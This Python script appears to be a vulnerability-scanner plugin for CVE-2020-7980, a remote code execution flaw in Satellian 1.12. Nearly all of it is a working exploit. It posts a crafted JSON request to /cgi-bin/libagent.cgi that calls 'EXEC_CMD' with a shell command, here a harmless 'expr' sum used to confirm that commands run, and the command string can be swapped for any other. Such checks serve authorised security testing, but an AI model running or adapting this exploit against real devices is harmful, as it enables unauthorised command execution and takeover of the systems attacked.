#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Satellian 1.12 Remote Code Execution CVE-2020-7980',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomInt(n,m):#返回某个范围中的int
  import random
  return random.randint(n,m)
def run(url,ua):
  r1 = randomInt(800000000,1000000000)
  r2 = randomInt(800000000,1000000000)
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/json',
      'Cookie': 'ctr_t=0; sid=123456789',
      }
  target = '/cgi-bin/libagent.cgi?type=J'
  data = '{"O_": "A", "F_": "EXEC_CMD", "S_": 123456789, "P1_": {"Q": "expr '+str(r1+r2) +'", "F": "EXEC_CMD"}, "V_": 1}'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if bytes(str(r1+r2)) in res.text:
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret